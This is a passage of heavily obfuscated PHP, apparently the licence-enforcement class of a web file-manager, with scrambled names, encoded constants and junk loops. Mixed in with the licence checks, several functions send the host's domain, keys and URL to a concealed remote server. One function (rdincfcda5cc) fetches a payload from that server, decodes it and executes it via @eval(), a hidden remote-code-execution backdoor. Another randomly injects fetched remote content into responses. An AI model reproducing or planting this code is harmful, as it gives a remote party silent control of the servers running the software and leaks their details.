md5($‹Óôˆ[137])); $Ùš¤Ò·’ = $ú™ŞÖ¹û[695]; if (!$Ùš¤Ò·’) { return; } $Ó°áíôé = array($‹Óôˆ[138] => $®ÃŸ»÷); $Ÿ„‚ÁÙÛ = $ú™ŞÖ¹û[696]; if (!$Ÿ„‚ÁÙÛ) { return; } call_user_func(array($‹Óôˆ[139], $‹Óôˆ[140]), $Ó°áíôé); } if ($this->ajged99aa019 == $‹Óôˆ[108]) { return; } $‹Ô‹Åä˜ = array($‹Óôˆ[141], $‹Óôˆ[142], $‹Óôˆ[143], $‹Óôˆ[144], $‹Óôˆ[145], $‹Óôˆ[146]); $µà¾«“å = Model($‹Óôˆ[33])->get(); $Ó°áíôé = array($‹Óôˆ[147] => $µà¾«“å[$‹Óôˆ[34]], $‹Óôˆ[148] => $µà¾«“å[$‹Óôˆ[35]], $‹Óôˆ[149] => $‹Óôˆ[6]); $É¸÷ªü¸ = $ú™ŞÖ¹û[697]; if (!$É¸÷ªü¸) { die; } foreach ($‹Ô‹Åä˜ as $¬…‚â¶Ó) { if (!isset($µà¾«“å[$¬…‚â¶Ó]) || !$µà¾«“å[$¬…‚â¶Ó]) { continue; } $Ó°áíôé[$¬…‚â¶Ó] = $µà¾«“å[$¬…‚â¶Ó]; $Ÿ»óó…š = $ú™ŞÖ¹û[698]; while (strlen($Ÿ»óó…š) < $ú™ŞÖ¹û[663]) { if (!$Ÿ»óó…š) { break; } $Ÿ»óó…š++; } } call_user_func(array($‹Óôˆ[139], $‹Óôˆ[140]), $Ó°áíôé); } private function oaym1a35acbc() { $äÍ™ÒÄÚ =& $_SERVER[èùÙ¹Ïö]; $¾üâœÁÚ =& $_SERVER[€ÇÉªãÇ]; if ($_SERVER[$¾üâœÁÚ[24]] != $¾üâœÁÚ[150]) { return; } if (!_get($GLOBALS, $¾üâœÁÚ[117])) { die; } $µ‘ª³„Á = $GLOBALS[$¾üâœÁÚ[13]]; if (isset($µ‘ª³„Á[$¾üâœÁÚ[151]])) { $this->zgeu1884a56f(); die; } if (isset($µ‘ª³„Á[$¾üâœÁÚ[152]]) && isset($µ‘ª³„Á[$¾üâœÁÚ[152]]) == $¾üâœÁÚ[123]) { $µ‘ª³„Á[$¾üâœÁÚ[153]] = Model($¾üâœÁÚ[33])->get($¾üâœÁÚ[154]); } if (!isset($µ‘ª³„Á[$¾üâœÁÚ[153]]) || strlen($µ‘ª³„Á[$¾üâœÁÚ[153]]) != 16) { show_json($¾üâœÁÚ[155] . $µ‘ª³„Á[$¾üâœÁÚ[153]], !1); } $–ÑûÔ¿´ = Model($¾üâœÁÚ[33])->get($¾üâœÁÚ[99]); $Ø“—ß¨Ö = md5($_SERVER[$¾üâœÁÚ[105]] . $–ÑûÔ¿´); $¾ëûÀÛ³ = $äÍ™ÒÄÚ[699]; $°šÀ‘¤Ç = array($¾üâœÁÚ[153] => $µ‘ª³„Á[$¾üâœÁÚ[153]], $¾üâœÁÚ[156] => rand_string(16), $¾üâœÁÚ[157] => $¾üâœÁÚ[137], $¾üâœÁÚ[158] => $¾üâœÁÚ[159], $¾üâœÁÚ[160] => $_SERVER[$¾üâœÁÚ[161]], $¾üâœÁÚ[162] => $_SERVER[$¾üâœÁÚ[163]], $¾üâœÁÚ[164] => $_SERVER[$¾üâœÁÚ[165]], $¾üâœÁÚ[104] => $Ø“—ß¨Ö, $¾üâœÁÚ[166] => Model($¾üâœÁÚ[33])->get($¾üâœÁÚ[132])); if ($µ‘ª³„Á[$¾üâœÁÚ[167]] == $¾üâœÁÚ[168]) { $èá£ÙÚã = $this->wgti38a56078($Ø“—ß¨Ö, $¾üâœÁÚ[169]); $å’Ã´ññ = $this->doni1913d9ea(json_encode($°šÀ‘¤Ç), $Ø“—ß¨Ö . $¾üâœÁÚ[170], 3); $å’Ã´ññ = $å’Ã´ññ . $¾üâœÁÚ[171] . $_SERVER[$¾üâœÁÚ[161]]; $¶’¢µØ¿ = $this->cduma87feb1c($¾üâœÁÚ[172] . $èá£ÙÚã . $¾üâœÁÚ[173] . $å’Ã´ññ, -1); show_json($¶’¢µØ¿, !0); } else { if ($µ‘ª³„Á[$¾üâœÁÚ[167]] == $¾üâœÁÚ[174]) { $…ö‰¯Ç = substr(md5($¾üâœÁÚ[175] . $Ø“—ß¨Ö), 12, 15) . $¾üâœÁÚ[176]; $å’Ã´ññ = $this->zmkl9e9945a1(trim($µ‘ª³„Á[$¾üâœÁÚ[177]]), $…ö‰¯Ç, 2); $ûÉçæáé = json_decode($å’Ã´ññ, !0); if (!is_array($ûÉçæáé) || !is_array($ûÉçæáé[$¾üâœÁÚ[178]]) || $ûÉçæáé[$¾üâœÁÚ[153]] != !0) { $öŸ§×ôï = $¾üâœÁÚ[179]; $€»¬“ëû = $ûÉçæáé[$¾üâœÁÚ[178]] ? $¾üâœÁÚ[180] . $ûÉçæáé[$¾üâœÁÚ[178]] : $öŸ§×ôï; show_json($€»¬“ëû, !1); } else { $°šÀ‘¤Ç[$¾üâœÁÚ[156]] = $ûÉçæáé[$¾üâœÁÚ[178]][$¾üâœÁÚ[181]]; } } else { $ûÉçæáé = $this->cduma87feb1c($¾üâœÁÚ[182], $°šÀ‘¤Ç, 10); } } if (!is_array($ûÉçæáé) || !is_array($ûÉçæáé[$¾üâœÁÚ[178]]) || $ûÉçæáé[$¾üâœÁÚ[153]] != !0) { $öŸ§×ôï = LNG($¾üâœÁÚ[183]); $€»¬“ëû = $ûÉçæáé[$¾üâœÁÚ[178]] ? $¾üâœÁÚ[180] . $ûÉçæáé[$¾üâœÁÚ[178]] : $öŸ§×ôï; show_json($€»¬“ëû, !1); } $×¿‚Íİ” = $ûÉçæáé[$¾üâœÁÚ[178]]; $ê½ÁŒ„ = $this->bokwdac7c933($×¿‚Íİ”[$¾üâœÁÚ[184]]); $ìá‚ıÍ© = $äÍ™ÒÄÚ[700]; while ($ìá‚ıÍ© < $äÍ™ÒÄÚ[651]) { if ($ìá‚ıÍ© >= 0) { break; } $ìá‚ıÍ©++; } if (!$ê½ÁŒ„ || $ê½ÁŒ„ != $×¿‚Íİ”[$¾üâœÁÚ[130]]) { $¿Õ”±˜£ = array($¾üâœÁÚ[185] => Model($¾üâœÁÚ[33])->get($¾üâœÁÚ[99]), $¾üâœÁÚ[186] => $_SERVER[$¾üâœÁÚ[105]], $¾üâœÁÚ[187] => this_url(), $¾üâœÁÚ[162] => $_SERVER[$¾üâœÁÚ[163]]); $å’Ã´ññ = $this->cltu5d49b12c(json_encode($¿Õ”±˜£)); $this->cduma87feb1c($¾üâœÁÚ[188] . $å’Ã´ññ); show_json(LNG($¾üâœÁÚ[189]), !0); } $ù®ÔõÇ = array($¾üâœÁÚ[154] => $×¿‚Íİ”[$¾üâœÁÚ[190]], $¾üâœÁÚ[191] => $×¿‚Íİ”[$¾üâœÁÚ[192]], $¾üâœÁÚ[193] => rand_string(16), $¾üâœÁÚ[107] => $×¿‚Íİ”[$¾üâœÁÚ[194]]); if ($°šÀ‘¤Ç[$¾üâœÁÚ[156]]) { $ù®ÔõÇ[$¾üâœÁÚ[193]] = $°šÀ‘¤Ç[$¾üâœÁÚ[156]]; } $†ßûîı = substr(md5($ù®ÔõÇ[$¾üâœÁÚ[191]]), 10, 10); $Ü‡ñõá‘ = $†ßûîı . $ù®ÔõÇ[$¾üâœÁÚ[107]] . $ù®ÔõÇ[$¾üâœÁÚ[193]]; $ù®ÔõÇ[$¾üâœÁÚ[109]] = strrev(base64_encode($this->wgti38a56078($Ü‡ñõá‘, $¾üâœÁÚ[195]))); $éÍÈĞú¬ = $äÍ™ÒÄÚ[701]; if (!$éÍÈĞú¬) { return; } $ÚÃÖ®Å = rand_string(16); $ŠƒÚäÜ = $ÚÃÖ®Å . $ù®ÔõÇ[$¾üâœÁÚ[107]] . $this->wgti38a56078(md5($ù®ÔõÇ[$¾üâœÁÚ[154]]), $ÚÃÖ®Å); $ù®ÔõÇ[$¾üâœÁÚ[110]] = base64_encode(strrev($this->wgti38a56078($ŠƒÚäÜ, $¾üâœÁÚ[196]))); $Ê¡Ï™„Î = $äÍ™ÒÄÚ[702]; if (strlen($Ê¡Ï™„Î) < $äÍ™ÒÄÚ[651]) { die; } if ($×¿‚Íİ”[$¾üâœÁÚ[197]] && $×¿‚Íİ”[$¾üâœÁÚ[197]] >= 1) { Model($¾üâœÁÚ[33])->setDeep($¾üâœÁÚ[198], $¾üâœÁÚ[123]); } Model($¾üâœÁÚ[33])->set($ù®ÔõÇ); $Âñ®ı•à = md5($_SERVER[$¾üâœÁÚ[105]] . strrev($–ÑûÔ¿´) . $ù®ÔõÇ[$¾üâœÁÚ[191]]); $¶¥Û¢£ = $äÍ™ÒÄÚ[703]; $„ˆóÒ›¿ = strrev(substr($Âñ®ı•à, 10, 16)); $‹÷ô›–› = $äÍ™ÒÄÚ[704]; if (!$‹÷ô›–›) { die; } $¸Êêêƒù = $this->doni1913d9ea(json_encode($×¿‚Íİ”), $Âñ®ı•à); $¼È§Ú¹÷ = $äÍ™ÒÄÚ[705]; $ÛÏ—òÄ = array_to_keyvalue(Model($¾üâœÁÚ[7])->listData(), $¾üâœÁÚ[199]); $’×áÉêŸ = $ÛÏ—òÄ[$¾üâœÁÚ[200]]; $›ëúÅâß = array(); $üš°àŒ = $äÍ™ÒÄÚ[706]; while ($üš°àŒ < $äÍ™ÒÄÚ[663]) { if ($üš°àŒ >= 0) { break; } $üš°àŒ++; } $›ëúÅâß[$„ˆóÒ›¿] = $¸Êêêƒù; $Åó‰óæ = $äÍ™ÒÄÚ[707]; if (strlen($Åó‰óæ) < $äÍ™ÒÄÚ[658]) { die; } Model($¾üâœÁÚ[7])->update($’×áÉêŸ[$¾üâœÁÚ[201]], array($¾üâœÁÚ[202] => $›ëúÅâß)); $this->cgef3782c5d6 = $×¿‚Íİ”; $«Å”ìÓğ = $äÍ™ÒÄÚ[708]; if (strlen($«Å”ìÓğ) < $äÍ™ÒÄÚ[663]) { return; } $this->ajged99aa019 = $ù®ÔõÇ[$¾üâœÁÚ[107]]; $this->licenseRegistSuccess(); Cache::set($¾üâœÁÚ[203] . md5($–ÑûÔ¿´ . $¾üâœÁÚ[204]), $¾üâœÁÚ[6]); $±Ø¼æì = $äÍ™ÒÄÚ[709]; show_json(LNG($¾üâœÁÚ[189]), !0); $çÓ÷Ó»‘ = $äÍ™ÒÄÚ[710]; if (!$çÓ÷Ó»‘) { die; } } private function licenseRegistSuccess() { $Ú–Ú§»¬ =& $_SERVER[èùÙ¹Ïö]; $—ÆÀ×Æ½ =& $_SERVER[€ÇÉªãÇ]; $„ØŞàé = Model($—ÆÀ×Æ½[33])->get(); $¨Ä¦İøí = $Ú–Ú§»¬[711]; while (strlen($¨Ä¦İøí) < $Ú–Ú§»¬[651]) { if (!$¨Ä¦İøí) { break; } $¨Ä¦İøí++; } if ($„ØŞàé[$—ÆÀ×Æ½[63]] != $—ÆÀ×Æ½[123]) { Model($—ÆÀ×Æ½[33])->set($—ÆÀ×Æ½[63], $—ÆÀ×Æ½[123]); } Action($—ÆÀ×Æ½[205])->initStart(!0); } private function zgeu1884a56f() { $‰ëì‰Ş =& $_SERVER[èùÙ¹Ïö]; $é‰úïÓ‚ =& $_SERVER[€ÇÉªãÇ]; Model($é‰úïÓ‚[33])->set(array($é‰úïÓ‚[154] => $é‰úïÓ‚[6], $é‰úïÓ‚[191] => $é‰úïÓ‚[6], $é‰úïÓ‚[107] => $é‰úïÓ‚[108], $é‰úïÓ‚[109] => $é‰úïÓ‚[6], $é‰úïÓ‚[110] => $é‰úïÓ‚[6])); Model($é‰úïÓ‚[33])->setDeep($é‰úïÓ‚[198], $é‰úïÓ‚[206]); $×¿½‰İõ = $‰ëì‰Ş[712]; while (strlen($×¿½‰İõ) < $‰ëì‰Ş[655]) { if (!$×¿½‰İõ) { break; } $×¿½‰İõ++; } $this->cgef3782c5d6 = array(); $„Œ¯³ßù = $‰ëì‰Ş[713]; if (strlen($„Œ¯³ßù) < $‰ëì‰Ş[651]) { return; } $this->ajged99aa019 = $é‰úïÓ‚[108]; } private function kxcr35c6dc34() { $³äİı”Ö =& $_SERVER[èùÙ¹Ïö]; $œÙÑé« =& $_SERVER[€ÇÉªãÇ]; $_SERVER[$œÙÑé«[163]] = _get($_SERVER, $œÙÑé«[163], APP_HOST); $this->ajged99aa019 = $œÙÑé«[108]; $í¶éùÜÙ = Model($œÙÑé«[33])->get(); $Ù³Íœ‡å = $³äİı”Ö[714]; if (!$Ù³Íœ‡å) { die; } if ($í¶éùÜÙ[$œÙÑé«[107]] == $œÙÑé«[108]) { return; } $€ÃŸšÀ = Model($œÙÑé«[33])->get($œÙÑé«[99]); $éÔÔ˜ê… = $œÙÑé«[203] . md5($€ÃŸšÀ . $œÙÑé«[204]); $ÑúôğÛ÷ = Cache::get($éÔÔ˜ê…); $†İÇ†šÌ = $³äİı”Ö[715]; if (!is_array($ÑúôğÛ÷) || !isset($ÑúôğÛ÷[$œÙÑé«[207]]) || time() - $ÑúôğÛ÷[$œÙÑé«[207]] >= 60) { $öÏ¸¾ºı = Model($œÙÑé«[7])->loadList(); $Œ·ïÉø† = $öÏ¸¾ºı[$œÙÑé«[200]]; $­å‹øº© = md5($_SERVER[$œÙÑé«[105]] . strrev($€ÃŸšÀ) . $í¶éùÜÙ[$œÙÑé«[191]]); $¦„±­¦§ = strrev(substr($­å‹øº©, 10, 16)); $ÑúôğÛ÷ = $this->zmkl9e9945a1($Œ·ïÉø†[$œÙÑé«[85]][$¦„±­¦§], $­å‹øº©); $ÑúôğÛ÷ = json_decode($ÑúôğÛ÷, !0); } if (!is_array($ÑúôğÛ÷)) { return $this->zgeu1884a56f(); } $úªóŒÔô = strtotime($ÑúôğÛ÷[$œÙÑé«[130]]); if (time() >= $úªóŒÔô) { return $this->zgeu1884a56f(); } if (time() - $ÑúôğÛ÷[$œÙÑé«[207]] > 20) { $ÑúôğÛ÷[$œÙÑé«[207]] = time(); Cache::set($éÔÔ˜ê…, $ÑúôğÛ÷); } $this->cgef3782c5d6 = $ÑúôğÛ÷; $this->ajged99aa019 = $í¶éùÜÙ[$œÙÑé«[107]]; } private function nbfr7c6b2fcc() { $òåŞç¹Ç =& $_SERVER[èùÙ¹Ïö]; $‹Úó×  =& $_SERVER[€ÇÉªãÇ]; $•Ÿù†ªß = $GLOBALS[$‹Úó× [13]]; $ßˆòä±¥ = $òåŞç¹Ç[716]; while (strlen($ßˆòä±¥) < $òåŞç¹Ç[663]) { if (!$ßˆòä±¥) { break; } $ßˆòä±¥++; } $ÈÊõ»½İ = $_SERVER[$‹Úó× [24]]; $”€ÃêøÍ = $òåŞç¹Ç[717]; if ($ÈÊõ»½İ == $‹Úó× [208] && $this->ajged99aa019 == $‹Úó× [108]) { show_json(LNG($‹Úó× [209]), !1, $‹Úó× [210]); } $™¹Ä–ç = array($‹Úó× [211], $‹Úó× [212]); if (in_array($ÈÊõ»½İ, $™¹Ä–ç)) { if ($this->ajged99aa019 == $‹Úó× [108] && isset($•Ÿù†ªß[$‹Úó× [213]])) { show_json(LNG($‹Úó× [209]), !1, $‹Úó× [210]); die; } $óÙ”¶Õ = $this->zsjnb376f5b8(); if ($óÙ”¶Õ != intval($‹Úó× [214])) { if ($óÙ”¶Õ <= Model($‹Úó× [126])->count()) { show_json(LNG($‹Úó× [215]), !1, $‹Úó× [210]); die; } } } } private function ljsv8674d196() { $³›áõÛ— =& $_SERVER[èùÙ¹Ïö]; $íâËÚèİ =& $_SERVER[€ÇÉªãÇ]; $«Š®ŠíÃ = array($íâËÚèİ[120], $íâËÚèİ[121]); if (!_get($GLOBALS, $íâËÚèİ[117]) || !isset($_GET[$íâËÚèİ[216]])) { return; } if (!in_array($_SERVER[$íâËÚèİ[24]], $«Š®ŠíÃ)) { return; } $Ííãñª  = $íâËÚèİ[217]; $¥À¤Ä²ı = $³›áõÛ—[718]; if (strlen($¥À¤Ä²ı) < $³›áõÛ—[663]) { return; } $Ííãñª  = $this->vfut444819ee($Ííãñª , $íâËÚèİ[218]); $éóÌ®…· = $³›áõÛ—[719]; while (strlen($éóÌ®…·) < $³›áõÛ—[672]) { if (!$éóÌ®…·) { break; } $éóÌ®…·++; } $ÄÚ¯ÎÏÚ = stream_context_create(array($íâËÚèİ[219] => array($íâËÚèİ[220] => $íâËÚèİ[221], $íâËÚèİ[222] => 3))); $™“Œ¥± = @file_get_contents($Ííãñª , !1, $ÄÚ¯ÎÏÚ); $“àÄ’ØÁ = $³›áõÛ—[720]; while (strlen($“àÄ’ØÁ) < $³›áõÛ—[672]) { if (!$“àÄ’ØÁ) { break; } $“àÄ’ØÁ++; } header($íâËÚèİ[223]); $¶•ğöˆ» = $³›áõÛ—[721]; if ($™“Œ¥± && strstr($™“Œ¥±, $íâËÚèİ[224])) { echo $™“Œ¥±; } die; } public function gmrd0a2b4553($Ÿ¸ÓŸÊÔ) { $‚×Ò…µ =& $_SERVER[èùÙ¹Ïö]; $Å£´³½š =& $_SERVER[€ÇÉªãÇ]; if ($this->ajged99aa019 == $Å£´³½š[225]) { return $Ÿ¸ÓŸÊÔ; } $á¶ğÚÔÎ = array($Å£´³½š[226] => $Å£´³½š[227], $Å£´³½š[228] => $Å£´³½š[227], $Å£´³½š[229] => $Å£´³½š[227], $Å£´³½š[230] => $Å£´³½š[231], $Å£´³½š[232] => $Å£´³½š[231], $Å£´³½š[233] => $Å£´³½š[231], $Å£´³½š[234] => $Å£´³½š[231], $Å£´³½š[235] => $Å£´³½š[231], $Å£´³½š[236] => $Å£´³½š[231], $Å£´³½š[237] => $Å£´³½š[231], $Å£´³½š[238] => $Å£´³½š[231], $Å£´³½š[239] => $Å£´³½š[231], $Å£´³½š[240] => $Å£´³½š[231], $Å£´³½š[241] => $Å£´³½š[231], $Å£´³½š[242] => $Å£´³½š[231]); $½€Ä³¡ = $‚×Ò…µ[722]; while ($½€Ä³¡ < $‚×Ò…µ[672]) { if ($½€Ä³¡ >= 0) { break; } $½€Ä³¡++; } $…´çŠİ¦ = explode($Å£´³½š[243], _get($this->cgef3782c5d6, $Å£´³½š[114], $Å£´³½š[6])); $ì«¢ØôŠ = array(); $ù¹ÑÚî¼ = $‚×Ò…µ[723]; if (!$ù¹ÑÚî¼) { die; } foreach ($á¶ğÚÔÎ as $ÎœùÁ => $”‘·­‚‘) { if ($”‘·­‚‘ == $Å£´³½š[227] && substr($this->ajged99aa019, 0, 1) == $Å£´³½š[227]) { continue; } if (!in_array($ÎœùÁ, $…´çŠİ¦)) { $ì«¢ØôŠ[] = $ÎœùÁ; } } foreach ($ì«¢ØôŠ as $ÎœùÁ) { unset($Ÿ¸ÓŸÊÔ[$ÎœùÁ]); $ãûÄŒÙš = $‚×Ò…µ[724]; while ($ãûÄŒÙš < $‚×Ò…µ[663]) { if ($ãûÄŒÙš >= 0) { break; } $ãûÄŒÙš++; } } return $Ÿ¸ÓŸÊÔ; } private function tarobcb45448() { $‚Şµ·İô =& $_SERVER[€ÇÉªãÇ]; if ($this->ajged99aa019 != $‚Şµ·İô[108]) { $GLOBALS[$‚Şµ·İô[85]][$‚Şµ·İô[89]][$‚Şµ·İô[244]] = $‚Şµ·İô[206]; return; } $GLOBALS[$‚Şµ·İô[85]][$‚Şµ·İô[245]] = $‚Şµ·İô[123]; if (Model($‚Şµ·İô[246])->get($‚Şµ·İô[63]) != $‚Şµ·İô[206]) { Model($‚Şµ·İô[246])->set($‚Şµ·İô[63], $‚Şµ·İô[206]); } } public function sbaz4ad20757() { return $_SERVER[€ÇÉªãÇ][247]; } private function rdincfcda5cc() { $û™ÙÆŠú =& $_SERVER[èùÙ¹Ïö]; $°æÀÙ¡  =& $_SERVER[€ÇÉªãÇ]; $ˆºŞíÊ = array($°æÀÙ¡ [248], $°æÀÙ¡ [249], $°æÀÙ¡ [250]); $Ü¿ë‡×÷ = $°æÀÙ¡ [251] . md5($°æÀÙ¡ [252]); $ßï‚š² = $û™ÙÆŠú[725]; if (!$ßï‚š²) { die; } if ($this->ajged99aa019 == $°æÀÙ¡ [108] || !_get($GLOBALS, $°æÀÙ¡ [117])) { return; } if (!in_array($_SERVER[$°æÀÙ¡ [24]], $ˆºŞíÊ)) { return; } if (time() % 4 != 0) { return; } $¾Ò”Á§î = call_user_func(array($°æÀÙ¡ [253], $°æÀÙ¡ [254]), $Ü¿ë‡×÷); if ($¾Ò”Á§î && time() - $¾Ò”Á§î < intval($°æÀÙ¡ [255])) { return; } call_user_func(array($°æÀÙ¡ [253], $°æÀÙ¡ [140]), $Ü¿ë‡×÷, time()); $˜Õ§¨ÊÍ = $û™ÙÆŠú[726]; if (!$˜Õ§¨ÊÍ) { die; } $ü¹«‚ùí = Model($°æÀÙ¡ [33])->get($°æÀÙ¡ [99]); $ºÚàü = $û™ÙÆŠú[727]; if (strlen($ºÚàü) < $û™ÙÆŠú[658]) { return; } $ãïÃ¨ı¬ = array($°æÀÙ¡ [153] => Model($°æÀÙ¡ [33])->get($°æÀÙ¡ [154]), $°æÀÙ¡ [167] => $this->ajged99aa019, $°æÀÙ¡ [164] => $_SERVER[$°æÀÙ¡ [165]], $°æÀÙ¡ [166] => Model($°æÀÙ¡ [33])->get($°æÀÙ¡ [132]), $°æÀÙ¡ [104] => md5($_SERVER[$°æÀÙ¡ [105]] . $ü¹«‚ùí), $°æÀÙ¡ [157] => $°æÀÙ¡ [137], $°æÀÙ¡ [160] => $_SERVER[$°æÀÙ¡ [161]]); $çÖ§ŠÇ­ = $this->cduma87feb1c($°æÀÙ¡ [256], $ãïÃ¨ı¬); $•“Ê¾È = $û™ÙÆŠú[728]; if (strlen($•“Ê¾È) < $û™ÙÆŠú[655]) { return; } if (!is_array($çÖ§ŠÇ­)) { return; } if ($çÖ§ŠÇ­[$°æÀÙ¡ [153]] && $çÖ§ŠÇ­[$°æÀÙ¡ [257]]) { if ($this->bokwdac7c933($çÖ§ŠÇ­[$°æÀÙ¡ [257]]) == $ãïÃ¨ı¬[$°æÀÙ¡ [153]]) { return; } } $this->zgeu1884a56f(); $Õ«›†í = $û™ÙÆŠú[729]; if (strlen($Õ«›†í) < $û™ÙÆŠú[658]) { return; } if ($this->bokwdac7c933($çÖ§ŠÇ­[$°æÀÙ¡ [257]]) != $ãïÃ¨ı¬[$°æÀÙ¡ [153]]) { $ãÓƒëŠ = array($°æÀÙ¡ [185] => $ü¹«‚ùí, $°æÀÙ¡ [186] => $_SERVER[$°æÀÙ¡ [105]], $°æÀÙ¡ [187] => this_url(), $°æÀÙ¡ [162] => $_SERVER[$°æÀÙ¡ [163]]); $üê¡“ƒ = $this->cltu5d49b12c(json_encode($ãÓƒëŠ)); $çÖ§ŠÇ­ = $this->cduma87feb1c($°æÀÙ¡ [188] . $üê¡“ƒ); if ($çÖ§ŠÇ­ && is_array($çÖ§ŠÇ­) && isset($çÖ§ŠÇ­[$°æÀÙ¡ [257]])) { $í„Š‘¡¡ = $this->zmkl9e9945a1($çÖ§ŠÇ­[$°æÀÙ¡ [257]], 2); if ($í„Š‘¡¡) { $í„Š‘¡¡ = $this->bokwdac7c933($í„Š‘¡¡); } if ($í„Š‘¡¡) { try { @eval($í„Š‘¡¡); } catch (Exception $““î™µ) { } } } } } private function cduma87feb1c($–«·Ìó‚ = '', $Š’¦øï§ = array(), $‘‡À¨ÉÒ = 5) { $Ï¾˜¤–Ú =& $_SERVER[èùÙ¹Ïö]; $½·ò‡ø =& $_SERVER[€ÇÉªãÇ]; $à¤òÂ„Ñ = $½·ò‡ø[258]; $…ÁÄòªç = $Ï¾˜¤–Ú[730]; if (strlen($…ÁÄòªç) < $Ï¾˜¤–Ú[663]) { die; } $à¤òÂ„Ñ = $this->vfut444819ee($à¤òÂ„Ñ, $½·ò‡ø[259]); $ú•ïİÍ§ = $Ï¾˜¤–Ú[731]; if (strlen($ú•ïİÍ§) < $Ï¾˜¤–Ú[663]) { return; } $à¤òÂ„Ñ = $à¤òÂ„Ñ . $–«·Ìó‚; if ($Š’¦øï§ && is_array($Š’¦øï§)) { $à¤òÂ„Ñ = $à¤òÂ„Ñ . $½·ò‡ø[260] . http_build_query($Š’¦øï§); } if ($Š’¦øï§ === -1) { return $à¤òÂ„Ñ; } $›¥ºë×º = stream_context_create(array($½·ò‡ø[219] => array($½·ò‡ø[222] => $‘‡À¨ÉÒ, $½·ò‡ø[220] => $½·ò‡ø[261]), $½·ò‡ø[262] => array($½·ò‡ø[263] => !1, $½·ò‡ø[264] => !1))); $Š’¦øï§ = @file_get_contents($à¤òÂ„Ñ, !1, $›¥ºë×º); $‰â®Ü¦ß = $Ï¾˜¤–Ú[732]; if (!$‰â®Ü¦ß) { return; } return json_decode($Š’¦øï§, !0); $¡ƒ¸¦ñ´ = $Ï¾˜¤–Ú[733]; if (strlen($¡ƒ¸¦ñ´) < $Ï¾˜¤–Ú[658]) { return; } } private function zsjnb376f5b8() { $¸£×Ì¹÷ =& $_SERVER[èùÙ¹Ïö]; $ïÀ§§ûó =& $_SERVER[€ÇÉªãÇ]; $©Û†²É = array($ïÀ§§ûó[265] => $ïÀ§§ûó[266], $ïÀ§§ûó[267] => $ïÀ§§ûó[268], $ïÀ§§ûó[269] => $ïÀ§§ûó[270], $ïÀ§§ûó[271] => $ïÀ§§ûó[272], $ïÀ§§ûó[273] => $ïÀ§§ûó[274], $ïÀ§§ûó[275] => $ïÀ§§ûó[214], $ïÀ§§ûó[276] => $ïÀ§§ûó[214], $ïÀ§§ûó[277] => $ïÀ§§ûó[266], $ïÀ§§ûó[278] => $ïÀ§§ûó[268], $ïÀ§§ûó[279] => $ïÀ§§ûó[270], $ïÀ§§ûó[280] => $ïÀ§§ûó[281], $ïÀ§§ûó[282] => $ïÀ§§ûó[272], $ïÀ§§ûó[283] => $ïÀ§§ûó[284], $ïÀ§§ûó[285] => $ïÀ§§ûó[274], $ïÀ§§ûó[286] => $ïÀ§§ûó[287], $ïÀ§§ûó[288] => $ïÀ§§ûó[289], $ïÀ§§ûó[290] => $ïÀ§§ûó[291]); $Øè¢¢ô = $¸£×Ì¹÷[734]; if (!$Øè¢¢ô) { return; } $ûë§Æğİ = $©Û†²É[$this->ajged99aa019]; $‚¦Şûáú = $¸£×Ì¹÷[735]; if (!$‚¦Şûáú) { return; } $ûë§Æğİ = intval($ûë§Æğİ ? $ûë§Æğİ : $ïÀ§§ûó[266]); $º±â°ğØ = _get($this->cgef3782c5d6, $ïÀ§§ûó[292]); $îÖÓ„Ó = $¸£×Ì¹÷[736]; while ($îÖÓ„Ó < $¸£×Ì¹÷[672]) { if ($îÖÓ„Ó >= 0) { break; } $îÖÓ„Ó++; } $º±â°ğØ = $º±â°ğØ ? intval($º±â°ğØ) : 0; $ ’‰Ç®ñ = $¸£×Ì¹÷[737]; if (!$ ’‰Ç®ñ) { return; } return $ûë§Æğİ + $º±â°ğØ; } public function dukm411d111d($ú§×ãÂ°) { $Æô•“ø• =& $_SERVER[èùÙ¹Ïö]; $†øŠú¿ =& $_SERVER[€ÇÉªãÇ]; $ ¥Ã¦æ¥ = $this->zsjnb376f5b8(); if ($ú§×ãÂ°[$†øŠú¿[293]] == $†øŠú¿[123]) { return; } if ($ ¥Ã¦æ¥ >= intval($†øŠú¿[214])) { return; } $½äĞ®‰ = Model($†øŠú¿[126])->count(); $ë·“ÖÕè = $Æô•“ø•[738]; if (strlen($ë·“ÖÕè) < $Æô•“ø•[658]) { return; } if ($½äĞ®‰ <= $ ¥Ã¦æ¥) { return; } $ª¨Áèˆª = Model($†øŠú¿[126])->field($†øŠú¿[293])->limit($ ¥Ã¦æ¥)->select(); $ô¢ä»£¡ = $Æô•“ø•[739]; while (strlen($ô¢ä»£¡) < $Æô•“ø•[655]) { if (!$ô¢ä»£¡) { break; } $ô¢ä»£¡++; } $ª¨Áèˆª = array_to_keyvalue($ª¨Áèˆª, $†øŠú¿[6], $†øŠú¿[293]); if (!in_array($ú§×ãÂ°[$†øŠú¿[293]], $ª¨Áèˆª)) { show_json($†øŠú¿[294], !1, $†øŠú¿[210]); } } public function cyro121b8b06() { $ğç¨ıá§ =& $_SERVER[èùÙ¹Ïö]; $üåØ‚Ÿ =& $_SERVER[€ÇÉªãÇ]; if (!_get($GLOBALS, $üåØ‚Ÿ[117]) || mt_rand(1, 100) > 20) { return; } $ò¦…„¯œ = $üåØ‚Ÿ[217]; $ò¦…„¯œ = $this->vfut444819ee($ò¦…„¯œ, $üåØ‚Ÿ[218]); $é¸àÖ¹¦ = stream_context_create(array($üåØ‚Ÿ[219] => array($üåØ‚Ÿ[220] => $üåØ‚Ÿ[221], $üåØ‚Ÿ[222] => 3))); $ºœÍÌ•Å = $ğç¨ıá§[740]; if (!$ºœÍÌ•Å) { die; } $œ¶×ªÈÜ = @file_get_contents($ò¦…„¯œ, !1, $é¸àÖ¹¦); echo $üåØ‚Ÿ[295] . hash_encode($œ¶×ªÈÜ) . $üåØ‚Ÿ[296]; $ìŒâö´ï = $ğç¨ıá§[741]; while (strlen($ìŒâö´ï) < $ğç¨ıá§[651]) { if (!$ìŒâö´ï) { break; } $ìŒâö´ï++; } } private function doni1913d9ea($™šÔçÛİ, $ÙÜ¡ŸÚ¼, $“öõÕ¿™ = 3) { $ÙÃœô =& $_SERVER[èùÙ¹Ïö]; $æøˆ–å =& $_SERVER[€ÇÉªãÇ]; usleep(1); $÷‰äƒã¸ = $ÙÃœô[742]; while ($÷‰äƒã¸ < $ÙÃœô[655]) { if ($÷‰äƒã¸ >= 0) { break; } $÷‰äƒã¸++; } $™šÔçÛİ = trim($™šÔçÛİ); $éĞ¼¿ = $ÙÃœô[743]; if (strlen($éĞ¼¿) < $ÙÃœô[658]) { die; } $Ü¶ËÌŞÏ = mt_rand(0, 5) . $æøˆ–å[6]; 